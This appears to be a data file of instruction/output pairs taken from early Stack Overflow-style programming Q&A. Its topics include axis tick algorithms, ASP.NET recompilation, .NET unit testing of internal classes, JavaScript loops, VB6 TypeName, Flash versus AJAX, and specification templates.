{"instruction": "Does anyone have a decent algorithm for calculating axis minima and maxima? \nWhen creating a chart for a given set of data items, I'd like to be able to give the algorithm: \n\nthe maximum (y) value in the set \nthe minimum (y) value in the set \nthe number of tick marks to appear on the axis \nan optional value that must appear as a tick (e.g. zero when showing +ve and -ve values)\n\nThe algorithm should return\n\nthe largest axis value \nthe smallest axis value (although that could be inferred from the largest, the interval size and the number of ticks)\nthe interval size \n\nThe ticks should be at a regular interval should be of a \"reasonable\" size (e.g. 1, 3, 5, possibly even 2.5, but not any more sig figs). \nThe presence of the optional value will skew this, but without that value the largest item should appear between the top two tick marks, the lowest value between the bottom two. \nThis is a language-agnostic question, but if there's a C#/.NET library around, that would be smashing ;)", "output": "I've been using the jQuery flot graph library.  It's open source and does axis/tick generation quite well.  I'd suggest looking at it's code and pinching some ideas from there."}
{"instruction": "I have a ASP.net 2.0 app and I have made some changes the the source file ( cs files ). I uploaded the changes with the belief that it would auto-recompile. I also have the compiled dll in MY_APP/bin. I checked it and noticed that it did not recompile. Please understand I am new to this.", "output": "Where did you upload the changes? Source control, web server? \nDid you run a build first? Local or remotely?"}
{"instruction": "I have a ASP.net 2.0 app and I have made some changes the the source file ( cs files ). I uploaded the changes with the belief that it would auto-recompile. I also have the compiled dll in MY_APP/bin. I checked it and noticed that it did not recompile. Please understand I am new to this.", "output": "In VS menu you have Build -> Rebuild Solution"}
{"instruction": "I have a ASP.net 2.0 app and I have made some changes the the source file ( cs files ). I uploaded the changes with the belief that it would auto-recompile. I also have the compiled dll in MY_APP/bin. I checked it and noticed that it did not recompile. Please understand I am new to this.", "output": "my #1 way to do this, add white space to the top of the web config file, after the xml declaration tag.\nIt forces the node to re-cache and recompile. We even have a page deep in the admin called Flush.aspx that does it for us."}
{"instruction": "I have a ASP.net 2.0 app and I have made some changes the the source file ( cs files ). I uploaded the changes with the belief that it would auto-recompile. I also have the compiled dll in MY_APP/bin. I checked it and noticed that it did not recompile. Please understand I am new to this.", "output": "It's always best to just actually run a build after making .cs changes. \nWhere are you running it? Is this for debugging or production?"}
{"instruction": "I am trying to find a way to determine at run-time how much memory a given class is using in .NET.  Using Marshal.SizeOf() is out, as it only works on value types.  Is there a way to check exactly how much memory a class uses?", "output": "I agree that a memory profiler is the easiest way to get the information you are looking for. In addition to the two previously mentioned, I recommend JetBrains dotTrace, which is both a performance profiler and a memory profiler.\nIf you want to do it yourself, and are willing to get pretty deep into the guts of the CLR, you can use the .NET Profiling API, which is an unmanaged API that (as Microsoft says): \"enables a profiler to monitor a program's execution by the common language runtime (CLR).\" It's not exactly intended for casual use, but it does have an enormous amount of functionality."}
{"instruction": "I have a ASP.net 2.0 app and I have made some changes the the source file ( cs files ). I uploaded the changes with the belief that it would auto-recompile. I also have the compiled dll in MY_APP/bin. I checked it and noticed that it did not recompile. Please understand I am new to this.", "output": "I use a similar method to ChanChan, but instead of whitespace I put a comment in the web.config to indicate when/why the config was edited."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Python: Functional, One-liner\nfactorial = lambda n: reduce(lambda x,y: x*y, range(1, n+1), 1)\n\nNOTE:\n\nIt supports big integers. Example:\n\n\nprint factorial(100)\n93326215443944152681699238856266700490715968264381621468592963895217599993229915\\\n608941463976156518286253697920827223758251185210916864000000000000000000000000\n\n\n\nIt does not work for n < 0."}
{"instruction": "I would like my Core assembly to not expose a certain class and I would still like to be able to test it. How can I do that ?", "output": "InternalsVisibleTo attribute to the rescue!\nJust add:  \n[assembly:InternalsVisibleToAttribute(\"UnitTestAssemblyName\")]\n\nto your Core classes AssemblyInfo.cs file\nSee Friend Assemblies (C# Programming Guide) for best practices."}
{"instruction": "I would like my Core assembly to not expose a certain class and I would still like to be able to test it. How can I do that ?", "output": "You can use reflection (as the MS Test items do), or you can declare the unit test assembly a friend of the core assembly.\nThe other option is to put the unit tests in the same assembly."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "This is one of the faster algorithms, up to 170!.  It fails inexplicably beyond 170!, and it's relatively slow for small factorials, but for factorials between 80 and 170 it's blazingly fast compared to many algorithms.\ncurl http://www.google.com/search?q=170!\n\nThere's also an online interface, try it out now! \nLet me know if you find a bug, or faster implementation for large factorials.\n\nEDIT:\nThis algorithm is slightly slower, but gives results beyond 170:\ncurl http://www58.wolframalpha.com/input/?i=171!\n\nIt also simplifies them into various other representations."}
{"instruction": "I would like my Core assembly to not expose a certain class and I would still like to be able to test it. How can I do that ?", "output": "With InternalsVisible if your assemblies are strongly named you need to specify the public key (note: the full key not the public key token) for example...\n[assembly: System.Runtime.CompilerServices.InternalsVisibleTo(\"BoardEx_BusinessObjects.Tests, \n  PublicKey=0024000004800000940000000602000000240000525341310004000001000100fb3a2d8 etc etc\")]\n\nand the following trick is really useful for getting the public key without resorting to the cmd line...\nhttp://www.andrewconnell.com/blog/archive/2006/09/15/4587.aspx"}
{"instruction": "Over the last few months/years, I have shared a folder or two with numerous people on my domain. How do I easily revoke those shares to keep access to my system nice and tidy?", "output": "You can also achieve this via the command line:\n\nC:>net share share-name /d"}
{"instruction": "I would like my Core assembly to not expose a certain class and I would still like to be able to test it. How can I do that ?", "output": "I would suggest not going to such troubles ... if you really want to unit test your \"internal\" classes, just hide them away in a namespace that only your internal code would end up using.  Unless you're writing a framework on the scale of the .NET framework, you don't really need that level of hiding."}
{"instruction": "I am trying to find a way to determine at run-time how much memory a given class is using in .NET.  Using Marshal.SizeOf() is out, as it only works on value types.  Is there a way to check exactly how much memory a class uses?", "output": "just link to related SO question:\n\nsizeof() equivalent for reference types?"}
{"instruction": "How can I build a loop in JavaScript?", "output": "A loop in JavaScript looks like this:\nfor (var=startvalue;var<=endvalue;var=var+increment) \n{\n    code to be executed\n}"}
{"instruction": "How can I build a loop in JavaScript?", "output": "In addition to for loops, there's also while loops.  \nCheck out w3schools.com for some decent tutorials."}
{"instruction": "How can I build a loop in JavaScript?", "output": "Here is an example of a for loop:\nWe have an array of items nodes.\nfor(var i = 0; i< nodes.length; i++){\n    var node = nodes[i];\n    alert(node);\n}"}
{"instruction": "How can I build a loop in JavaScript?", "output": "For loops\nfor (i = startValue; i <= endValue; i++) {\n    // Before the loop: i is set to startValue\n    // After each iteration of the loop: i++ is executed\n    // The loop continues as long as i <= endValue is true\n}\n\nFor...in loops\nfor (i in things) {\n    // If things is an array, i will usually contain the array keys *not advised*\n    // If things is an object, i will contain the member names\n    // Either way, access values using: things[i]\n}\n\nIt is bad practice to use for...in loops to itterate over arrays. It goes against the ECMA 262 standard and can cause problems when non-standard attributes or methods are added to the Array object, e.g. by Prototype.\n(Thanks to Chase Seibert for pointing this out in the comments)\nWhile loops\nwhile (myCondition) {\n    // The loop will continue until myCondition is false\n}"}
{"instruction": "I'm writing up some productivity/metrics tools for myself to help monitor my focus throughout the day. Recently, I've noticed that I tend to get off track more than usual and feel the need to get up and go for walks/drinks/etc and I'm concerned that I'm \"wasting\" too much time.\nSince I always lock my computer when I go anywhere, and I unlock it as soon as I return (even if I'm just reading at my desk, etc), I was wondering how I can determine, in code, how long the machine is locked.\nI'm writing this in C# if that helps, but I'm open to other ideas.\n\nI like the windows service idea (and have accepted it) for simplicity and cleanliness, but unfortunately I don't think it will work for me in this particular case. I wanted to run this on my workstation at work rather than home (or in addition to home, I suppose), but it's locked down pretty hard courtesy of the DoD. That's part of the reason I'm rolling my own, actually.\nI'll write it up anyway and see if it works. Thanks everyone!", "output": "The solution below uses the Win32 API.  OnSessionLock is called when the workstation is locked, and OnSessionUnlock is called when it is unlocked.\n[DllImport(\"wtsapi32.dll\")]\nprivate static extern bool WTSRegisterSessionNotification(IntPtr hWnd,\nint dwFlags);\n\n[DllImport(\"wtsapi32.dll\")]\nprivate static extern bool WTSUnRegisterSessionNotification(IntPtr\nhWnd);\n\nprivate const int NotifyForThisSession = 0; // This session only\n\nprivate const int SessionChangeMessage = 0x02B1;\nprivate const int SessionLockParam = 0x7;\nprivate const int SessionUnlockParam = 0x8;\n\nprotected override void WndProc(ref Message m)\n{\n    // check for session change notifications\n    if (m.Msg == SessionChangeMessage)\n    {\n        if (m.WParam.ToInt32() == SessionLockParam)\n            OnSessionLock(); // Do something when locked\n        else if (m.WParam.ToInt32() == SessionUnlockParam)\n            OnSessionUnlock(); // Do something when unlocked\n    }\n\n    base.WndProc(ref m);\n    return;\n}\n\nvoid OnSessionLock() \n{\n    Debug.WriteLine(\"Locked...\");\n}\n\nvoid OnSessionUnlock() \n{\n    Debug.WriteLine(\"Unlocked...\");\n}\n\nprivate void Form1Load(object sender, EventArgs e)\n{\n    WTSRegisterSessionNotification(this.Handle, NotifyForThisSession);\n}\n\n// and then when we are done, we should unregister for the notification\n//  WTSUnRegisterSessionNotification(this.Handle);"}
{"instruction": "If you've used Oracle, you've probably gotten the helpful message \"ORA-00942: Table or view does not exist\". Is there a legitimate technical reason the message doesn't include the name of the missing object? \nArguments about this being due to security sound like they were crafted by the TSA. If I'm an attacker, I'd know what table I just attempted to exploit, and be able to interpret this unhelpful message easily. If I'm a developer working with a complex join through several layers of application code, it's often very difficult to tell.\nMy guess is that when this error was originally implemented, someone neglected to add the object name, and now, people are afraid it will break compatibility to fix it. (Code doing silly things like parsing the error message will be confused if it changes.)\nIs there a developer-friendly (as opposed to recruiting your DBA) way to determine the name of the missing table?\n\nAlthough I've accepted an answer which is relevant to the topic, it doesn't really answer my question: Why isn't the name part of the error message? If anyone can come up with the real answer, I'll be happy to change my vote.", "output": "SQL*Plus does tell you the table that doesn't exist. For example:\nSQL> select\n  2     *\n  3  from\n  4     user_tables a,\n  5     non_existent_table b\n  6  where\n  7     a.table_name = b.table_name;\n   non_existent_table b\n   *\nERROR at line 5:\nORA-00942: table or view does not exist\n\nHere it shows that the name of the missing table and the line number in the SQL statement where the error occurs.\nSimilarly, in a one-line SQL statement you can see the asterisk highlighting the name of the unknown table:\nSQL> select * from user_tables a, non_existent_table b where a.table_name = b.table_name;\nselect * from user_tables a, non_existent_table b where a.table_name = b.table_name\n                             *\nERROR at line 1:\nORA-00942: table or view does not exist\n\nIn terms of your question, I guess the reason the error message doesn't include the name of the table is that the error message itself needs to be static text. The line number and location in the line of the error is clearly passed back to SQL*Plus (somehow)."}
{"instruction": "We provide a web application with a frontend completely developed in Adobe Flash. When we chose Flash 6 years ago, we did so for its large number of features for user interaction, like dragging stuff, opening and closing menus, tree navigation elements, popup dialogs etc.\nToday it's obvious that AJAX/JS offers roughly the same possibilities and because of the number of frameworks that are readily available, it's very feasible to implement them.\nIs there a technical reason one should choose either technology over the other? By \"technical\", I mean performance, security, portability/compatibility and the like. I don't mean aspects such as the very non-programmer way development is done in Flash or whether it makes sense to switch an app from one to the other.\nAs I just explained in another question, it seems to me that JS is way ahead in terms of market share and I'm wondering whether we are missing some important point if we stick to Flash.", "output": "JS and Flash both have great presence on the web with overlapping capabilities. One area JS is still lacking is in rendering video."}
{"instruction": "We provide a web application with a frontend completely developed in Adobe Flash. When we chose Flash 6 years ago, we did so for its large number of features for user interaction, like dragging stuff, opening and closing menus, tree navigation elements, popup dialogs etc.\nToday it's obvious that AJAX/JS offers roughly the same possibilities and because of the number of frameworks that are readily available, it's very feasible to implement them.\nIs there a technical reason one should choose either technology over the other? By \"technical\", I mean performance, security, portability/compatibility and the like. I don't mean aspects such as the very non-programmer way development is done in Flash or whether it makes sense to switch an app from one to the other.\nAs I just explained in another question, it seems to me that JS is way ahead in terms of market share and I'm wondering whether we are missing some important point if we stick to Flash.", "output": "Correctly designed AJAX apps are more googleable than Flash\nCorrectly designed AJAX apps are more easily deep linkable than Flash\nAJAX doesn't require a plugin (Flash is pretty ubiquitous, so it's not really a big deal)*\nAJAX isn't controlled by a single company the way Flash is\n\nEdited to add:\n* Except for the iPhone, as Abdu points out."}
{"instruction": "We provide a web application with a frontend completely developed in Adobe Flash. When we chose Flash 6 years ago, we did so for its large number of features for user interaction, like dragging stuff, opening and closing menus, tree navigation elements, popup dialogs etc.\nToday it's obvious that AJAX/JS offers roughly the same possibilities and because of the number of frameworks that are readily available, it's very feasible to implement them.\nIs there a technical reason one should choose either technology over the other? By \"technical\", I mean performance, security, portability/compatibility and the like. I don't mean aspects such as the very non-programmer way development is done in Flash or whether it makes sense to switch an app from one to the other.\nAs I just explained in another question, it seems to me that JS is way ahead in terms of market share and I'm wondering whether we are missing some important point if we stick to Flash.", "output": "I think Flash should be limited to online games, videos and animation. Otherwise use html and Ajax. It's a web standard and supported by almost all devices.\nAFAIK, the iPhone doesn't support Flash. That's a fast growing segment you're blocking out already. Keep it simple and efficient."}
{"instruction": "We provide a web application with a frontend completely developed in Adobe Flash. When we chose Flash 6 years ago, we did so for its large number of features for user interaction, like dragging stuff, opening and closing menus, tree navigation elements, popup dialogs etc.\nToday it's obvious that AJAX/JS offers roughly the same possibilities and because of the number of frameworks that are readily available, it's very feasible to implement them.\nIs there a technical reason one should choose either technology over the other? By \"technical\", I mean performance, security, portability/compatibility and the like. I don't mean aspects such as the very non-programmer way development is done in Flash or whether it makes sense to switch an app from one to the other.\nAs I just explained in another question, it seems to me that JS is way ahead in terms of market share and I'm wondering whether we are missing some important point if we stick to Flash.", "output": "Although flash is pretty ubiquitous on desktop browsers, mobile support is very limited (flash lite? yeah, right). I get really frustrated looking up a restaurant on my phone only to find the entire site is flash based and I can't even get a phone number or address!"}
{"instruction": "How can you obtain the Type (the name as a string is sufficient) of an Object in VB6 at runtime?\ni.e. something like:\nIf Typeof(foobar) = \"CommandButton\" Then ...\n\n/EDIT: to clarify, I need to check on Dynamically Typed objects. An example:\nDim y As Object \n\nSet y = CreateObject(\"SomeType\")\n\nDebug.Print( <The type name of> y)\n\nWhere the output would be \"CommandButton\"", "output": "This should prove difficult, since in VB6 all objects are COM (IDispatch) things. Thus they are only an interface.\nTypeOf(object) is class probably only does a COM get_interface call (I forgot the exact method name, sorry)."}
{"instruction": "We provide a web application with a frontend completely developed in Adobe Flash. When we chose Flash 6 years ago, we did so for its large number of features for user interaction, like dragging stuff, opening and closing menus, tree navigation elements, popup dialogs etc.\nToday it's obvious that AJAX/JS offers roughly the same possibilities and because of the number of frameworks that are readily available, it's very feasible to implement them.\nIs there a technical reason one should choose either technology over the other? By \"technical\", I mean performance, security, portability/compatibility and the like. I don't mean aspects such as the very non-programmer way development is done in Flash or whether it makes sense to switch an app from one to the other.\nAs I just explained in another question, it seems to me that JS is way ahead in terms of market share and I'm wondering whether we are missing some important point if we stick to Flash.", "output": "In addition to what others have said, Flash is constrained in the \"rectangle\" and cannot be added to a normal html page in an un-obtrusive manner.\n@Gulzar I think when more browsers will support the video tag like mozilla 3.1 does we'll see even more adoption of ajax/js over flash."}
{"instruction": "I would like my Core assembly to not expose a certain class and I would still like to be able to test it. How can I do that ?", "output": "I put my unit tests in the same assembly as the code that it's testing.  This makes sense to me, because I think of \"test yourself\" as a feature of a class, along with things like \"initialize yourself\" and \"describe yourself\".\nI've heard some objections to this approach, but few of them have been convincing.\nIt hurts performance Bah, I say!  Don't optimize without hard data!  Perhaps if you are planning your assemblies to be downloaded over slow links, then minimizing assembly size would be worthwhile.  \nIt's a security risk.  Only if you have secrets in your tests.  Don't do that.\nNow, your situation is different from mine, so maybe it'll make sense for you, and maybe it won't.  You'll have to figure that out yourself.\nAside: In C#, I once tried putting my unit tests in a class named \"Tests\" that was nested inside the class that it was testing.  This made the correct organization of things obvious.  It also avoided the duplication of names that occurs when tests for the class \"Foo\" are in a class called \"FooTests\".  However, the unit testing frameworks that I had access to refused to accept tests that weren't marked \"public\".  This means that the class that you're testing can't be \"private\".  I can't think of any good reason to require tests to be \"public\", since no one really calls them as public methods - everything is through reflection.  If you ever write a unit testing framework for .Net, please consider allowing non-public tests, for my sake!"}
{"instruction": "We provide a web application with a frontend completely developed in Adobe Flash. When we chose Flash 6 years ago, we did so for its large number of features for user interaction, like dragging stuff, opening and closing menus, tree navigation elements, popup dialogs etc.\nToday it's obvious that AJAX/JS offers roughly the same possibilities and because of the number of frameworks that are readily available, it's very feasible to implement them.\nIs there a technical reason one should choose either technology over the other? By \"technical\", I mean performance, security, portability/compatibility and the like. I don't mean aspects such as the very non-programmer way development is done in Flash or whether it makes sense to switch an app from one to the other.\nAs I just explained in another question, it seems to me that JS is way ahead in terms of market share and I'm wondering whether we are missing some important point if we stick to Flash.", "output": "One benefit of Flash is that it has a few facilities to help do cross domain type operations safely, which can be helpful. Flash also has (limited) support for some hardware, which is not possible with Javascript. \nPersonally, I'd try to use as much Ajax as possible before turning to something like Flash. From the UI perspective, it is better in that the controls and basic authoring is a little more developed. The Sound Manager project is a good example of effectively using a small amount of Flash while keeping the remainder in Javascript."}
{"instruction": "We provide a web application with a frontend completely developed in Adobe Flash. When we chose Flash 6 years ago, we did so for its large number of features for user interaction, like dragging stuff, opening and closing menus, tree navigation elements, popup dialogs etc.\nToday it's obvious that AJAX/JS offers roughly the same possibilities and because of the number of frameworks that are readily available, it's very feasible to implement them.\nIs there a technical reason one should choose either technology over the other? By \"technical\", I mean performance, security, portability/compatibility and the like. I don't mean aspects such as the very non-programmer way development is done in Flash or whether it makes sense to switch an app from one to the other.\nAs I just explained in another question, it seems to me that JS is way ahead in terms of market share and I'm wondering whether we are missing some important point if we stick to Flash.", "output": "Adobe Actionscript is a statically typed language, Javascript is dynamically typed.  Depending on your point of view, this may be a good thing or a bad thing.\nWith Javascript/HTML/CSS you're going to be heading into cross-browser compatibility hell, especially if you want to support older browsers.  This can be mitigated by the libraries that are available, but it's still a big headache.  With Flash, you write the code once and it just works in all browsers.\nEven with the libraries available, Flash user controls are simply more advanced than anything you can find in the world of Javascript/HTML.  In Javascript, you are not going to find anything that comes close to the simplicity and power of a databound user control that Flash provides.\n\nI don't see how Javascript has more of a \"market share\" than Flash.  Pretty much anyone with a web browser has a Flash plugin installed.  I'd be curious to know how many people disable Javascript but have a Flash plugin.\nAlso keep in mind that you're going to be in for a huge learning curve and lots of development time if you decide to switch your technology base so you'd really better have a good business reason to do it.\nThis decision also has a lot to do with what your application does and who your install base is.  \nEdit:  I see people have mentioned that the iPhone doesn't have Flash support.  I would expect this to change with the install base of the iPhone - Adobe would be crazy not to support it."}
{"instruction": "How can you obtain the Type (the name as a string is sufficient) of an Object in VB6 at runtime?\ni.e. something like:\nIf Typeof(foobar) = \"CommandButton\" Then ...\n\n/EDIT: to clarify, I need to check on Dynamically Typed objects. An example:\nDim y As Object \n\nSet y = CreateObject(\"SomeType\")\n\nDebug.Print( <The type name of> y)\n\nWhere the output would be \"CommandButton\"", "output": "I think what you are looking for is TypeName rather than TypeOf.\nIf TypeName(foobar) = \"CommandButton\" Then\n   DoSomething\nEnd If\n\nEdit: What do you mean Dynamic Objects?  Do you mean objects created with\nCreateObject(\"\"), cause that should still work.\nEdit: \nPrivate Sub Command1_Click()\n    Dim oObject As Object\n    Set oObject = CreateObject(\"Scripting.FileSystemObject\")\n    Debug.Print \"Object Type: \" & TypeName(oObject)\nEnd Sub\n\nOutputs\nObject Type: FileSystemObject"}
{"instruction": "How can you obtain the Type (the name as a string is sufficient) of an Object in VB6 at runtime?\ni.e. something like:\nIf Typeof(foobar) = \"CommandButton\" Then ...\n\n/EDIT: to clarify, I need to check on Dynamically Typed objects. An example:\nDim y As Object \n\nSet y = CreateObject(\"SomeType\")\n\nDebug.Print( <The type name of> y)\n\nWhere the output would be \"CommandButton\"", "output": "I don't have a copy of VB6 to hand, but I think you need the \nTypename()\n\nfunction... I can see it in Excel VBA, so it's probably in the same runtime. Interestingly, the help seems to suggest that it shouldn't work for a user-defined type, but that's about the only way I ever do use it.\nExcerpt from the help file:\n\nTypeName Function\nReturns a String that provides information about a variable.\nSyntax\nTypeName(varname)\nThe required varname argument is a\n  Variant containing any variable except\n  a variable of a user-defined type."}
{"instruction": "When java was young, people were excited about writing applets.  They were cool and popular, for a little while.  Now, I never see them anymore.  Instead we have flash, javascript, and a plethora of other web app-building technologies.\nWhy don't sites use java applets anymore?\nI'm also curious: historically, why do you think this occurred?  What could have been done differently to keep Java applets alive?", "output": "They took forever to load up and get going in the browser, and then for a lot of people they didn't work. When they finally did load, the interfaces were ugly and clunky. I think the poor user experience was a big step towards making applets obsolete.\nSo to answer the original question I have a question of my own - you ask \"Why don't sites use java applets anymore\", and my response is \"why would anyone want to?\""}
{"instruction": "So basically I am looking for good templates for writing both technical and functional specs on a project or work request.\nWhat do you use? How deep do you get while writing the specs? Any additional general tips you could provide would be appreciated.\nMy company needs these badly. I work for a contractor and right now we do not use these documents at all. \nEDIT: I have read Joel's take about Painless Specification, I really liked it, but are there any other opinions :)", "output": "If you want to purchase a book, Software Requirements by Karl Wiegers has templates for a few documents as an appendix. Unfortunately, I'm at work and that particular book is at home. If someone has it handy, they might be able to confirm that."}
{"instruction": "So basically I am looking for good templates for writing both technical and functional specs on a project or work request.\nWhat do you use? How deep do you get while writing the specs? Any additional general tips you could provide would be appreciated.\nMy company needs these badly. I work for a contractor and right now we do not use these documents at all. \nEDIT: I have read Joel's take about Painless Specification, I really liked it, but are there any other opinions :)", "output": "You can buy templates from ieee and other places, but I have always ended up making my own.\nFor a technical spec, \"Code Complete\" by Steve McDonnell has a good checklist, you can draw some info from that.  At my last job, I just made a template out of his section headers, and tweaked it from there.\nAs far as a functional spec, the important thing is to define all the interfaces:\n\nUI (screen mockups)\nSoftware interfaces (plugins, etc.)\nHardware interfaces (if appropriate)\nCommunications interfaces (Services, email, messaging, etc.)\n\nThere should also be a section for business rules, things that are important functionally that are not covered in any interface definition."}
{"instruction": "So basically I am looking for good templates for writing both technical and functional specs on a project or work request.\nWhat do you use? How deep do you get while writing the specs? Any additional general tips you could provide would be appreciated.\nMy company needs these badly. I work for a contractor and right now we do not use these documents at all. \nEDIT: I have read Joel's take about Painless Specification, I really liked it, but are there any other opinions :)", "output": "Not a template, but Joel has written a couple of articles on writing a functional spec. He also has sample here."}
{"instruction": "So basically I am looking for good templates for writing both technical and functional specs on a project or work request.\nWhat do you use? How deep do you get while writing the specs? Any additional general tips you could provide would be appreciated.\nMy company needs these badly. I work for a contractor and right now we do not use these documents at all. \nEDIT: I have read Joel's take about Painless Specification, I really liked it, but are there any other opinions :)", "output": "I happen to like this one, among others: ReadySet.\nHe sells a pro version too."}
{"instruction": "What are the different ways (programmatically and otherwise) to determine what versions of .NET are running on a system?", "output": "Directly from the source:\nHow to determine which versions and service pack levels of the Microsoft .NET Framework are installed"}
{"instruction": "What are the different ways (programmatically and otherwise) to determine what versions of .NET are running on a system?", "output": "Get the smallest .NET Framework download possible that will tell you based on the headers you are sending. It only works on Internet Explorer or if you have the Firefox extension installed. More info in Hanselman's blog post."}
{"instruction": "What are the different ways (programmatically and otherwise) to determine what versions of .NET are running on a system?", "output": "If you're using IIS6 and above, open up IIS and click on Web Service Extensions.  It will list each framework installed.  Granted, .NET 3.0 and 3.5 are both based on the 2.0 framework."}
{"instruction": "I have a 200+ case statement in Classic ASP which is getting out of control. It sets 5 variables, based on which case is selected. Address, Phone, Name etc. Just sets the variables and nothing else in each case.\nDatabases or files are not an option for this application.\nComing from the Perl world I would use a hash to store this info.", "output": "This should be done with a database, but since you said that is not an option, nothing you will write will be any less complex than a switch statement, since it's all required to live in your code (according to your terms of no db and no files).\nI mean, you could use an Excel Spreadsheet if the idea of a database is too complicated but technically that would be a file as well."}
{"instruction": "I'm sure this has already been asked and answered so I apologize in advance for that but I'm not figuring out the correct keywords to search for.  Searching for \"Pattern\" hits way too many Q & A's to be useful.\nI'm working on a regression testing app.  I'm displaying a form on the screen and according to which user is logged in to the app some of the fields should be read-only.  So I can abstract a field object and I can abstract a user object but what pattern should I be looking at to describe the intersection of these two concepts?  In other words how should I describe that for Field 1 and User A, the field should be read-only?  It seems like read-only (or not) should be a property of the Field class but as I said, it depends on which user is looking at the form.  I've considered a simple two-dimensional array (e. g. ReadOnly[Field,User] = True) but I want to make sure I've picked the most effective structure to represent this.    \nAre there any software design patterns regarding this kind of data structure?  Am I overcomplicating things--would a two-dimensional array be the best way to go here?  As I said if this has been asked and answered, I do apologize.  I did search here and didn't find anything and a Google search failed to turn up anything either.", "output": "At first blush it sounds more like you have two different types of users and they have different access levels.  This could be solved by inheritance (PowerUser, User) or by containing a security object or token that sets the level for the user.  \nIf you don't like inheritance as a rule, you could use a State pattern on the application, Decorate the user objects (Shudder) or possibly add strategy patterns for differing security levels.  But I think it's a little early yet, I don't normally apply patterns until I have a firm idea of how the item will grown and be maintained."}
{"instruction": "I have a 200+ case statement in Classic ASP which is getting out of control. It sets 5 variables, based on which case is selected. Address, Phone, Name etc. Just sets the variables and nothing else in each case.\nDatabases or files are not an option for this application.\nComing from the Perl world I would use a hash to store this info.", "output": "A lot of people use VBScript for Classic ASP, but you can use JavaScript / JScript on the server as an alternative.  As a matter of fact, this is my preferred way of doing Classic ASP before finally moving to .NET (except in some cases, you will have to mix in VBScript for special cases, i.e. Disconnected Recordset, ExecuteNoRecords, etc.).  It will provide you with better OOP support vs VBScript.  Maybe you can try refactor that to.some sort of Strategy pattern afterward.  Worth looking into I guess for better maintenance in the long run."}
{"instruction": "What are the different ways (programmatically and otherwise) to determine what versions of .NET are running on a system?", "output": "If you're wanting the current framework version in use then you can see that via:  \nSystem.Environment.Version"}
{"instruction": "What are the different ways (programmatically and otherwise) to determine what versions of .NET are running on a system?", "output": "It's not necessarily running I would say. Since you can have .NET 1.1, 2.0, 3.0 and 3.5 installed on the same machine and they can run perfectly side-by-side.  Meaning one of your app can be running on top of 1.1 and another web application is running on 2.0.\nIn IIS (for web app), this is quite easy, just go to the property of the virtual directory / application and go to the ASP.NET tab, you should see what version of .NET you are actually using (or rather, what version of ASP.NET which is pretty much tied into the .NET Framework version).\nps. just remember, you can only run 1 version of .NET Framework per application pool in IIS.\nSo if you try to use the same application pool to run different versions of the framework, you're in for a surprise.  Solution is to just create a framework version specific application pool (i.e. one pool for all 1.1 framework and another for 2.0 framework)"}
{"instruction": "I have a 200+ case statement in Classic ASP which is getting out of control. It sets 5 variables, based on which case is selected. Address, Phone, Name etc. Just sets the variables and nothing else in each case.\nDatabases or files are not an option for this application.\nComing from the Perl world I would use a hash to store this info.", "output": "The fact that you can't migrate this over to a database or a text file is a bit of an issue as they would be the best solution for this type of data. However, if you have to have it in the code you could always try putting it into a matrix that you predefine. Then you could provide a function that returns the data from a given row in the matrix."}
{"instruction": "So basically I am looking for good templates for writing both technical and functional specs on a project or work request.\nWhat do you use? How deep do you get while writing the specs? Any additional general tips you could provide would be appreciated.\nMy company needs these badly. I work for a contractor and right now we do not use these documents at all. \nEDIT: I have read Joel's take about Painless Specification, I really liked it, but are there any other opinions :)", "output": "Start off simple, and work your way from there.  Since this is your first experience working with this, use a word document with bullet points.  Write it, re-read it and provide enough detail that it makes sense.  For technical specifications, you may want to lead the developer toward a solution, but for functional specifications the \"how\" should be completely missing."}
{"instruction": "I grew up learning to code based on what I've experienced with the demoscene.  It seems to be a pretty sparse subculture in the US.  How many developers watch or participate in the scene?\nTeaser: If you haven't checked out the scene before, take a look at one of my favorites: Debris by Farbrausch.  Watch on demoscene.tv or download the app (179k) and run it yourself.  No video, all realtime rendering and audio.  Think, a small group of guys wrote this for a competition on their free time.", "output": "@BlaM\nIf it's code-porn demos you're after, you might be more interested in the 64k intro scene then.  Or intros/demos for other more limited platforms.\nFor example, Farbrausch's Fr08 is pretty recent (relative to my time spent in the scene) and was really well done for the time I thought: http://www.theproduct.de\nI do agree it's a different time now though, and the magic of those old DOS and Amiga days won't be coming back.. for me at least."}
{"instruction": "So basically I am looking for good templates for writing both technical and functional specs on a project or work request.\nWhat do you use? How deep do you get while writing the specs? Any additional general tips you could provide would be appreciated.\nMy company needs these badly. I work for a contractor and right now we do not use these documents at all. \nEDIT: I have read Joel's take about Painless Specification, I really liked it, but are there any other opinions :)", "output": "I would suggest to have a look at the Roberston's Volere template here. They are part of the Atlantic Systems Guild, together with people like Tom DeMarco and Timothy Lister of \"Peopleware\" fame.\nAs the template is copyrighted, I will not reproduce it here, but give you some of the main headers:\n\nThe Purpose of the Project\nThe Stakeholders\nMandated Constraints\nNaming Conventions and Terminology\nRelevant Facts and Assumptions\nThe Scope of the Work\nBusiness Data Model and Data Dictionary\nThe Scope of the Product\nFunctional Requirements\nLook and Feels Requirements\n...\n\nThere are many more, but this should give you an idea. The most interesting part of the template is the requirements shell that lists functional requirements on a kind of cue card. Again copyrighted, but truly valuable.\nLook here in chapter 9."}
